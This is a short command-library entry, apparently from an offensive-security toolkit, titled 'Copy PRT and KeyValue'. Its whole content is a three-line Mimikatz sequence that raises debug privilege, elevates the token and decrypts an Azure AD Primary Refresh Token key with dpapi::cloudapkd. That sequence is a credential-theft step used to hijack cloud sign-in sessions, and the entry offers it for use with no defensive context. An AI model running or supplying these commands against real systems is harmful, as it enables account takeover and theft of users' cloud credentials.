---
id: 31485804-15f7-4498-ac0e-56b25c9020ac
name: Copy PRT and KeyValue
type: command
executor: bash
data: 'Mimikatz> privilege::debug

  Mimikatz> token::elevate

  Mimikatz> dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect'
output: null
created_at: '2023-04-06T03:56:15.696605+00:00'
updated_at: '2023-05-25T05:46:38.502124+00:00'
---

# Copy PRT and KeyValue

```bash
Mimikatz> privilege::debug
Mimikatz> token::elevate
Mimikatz> dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect
```


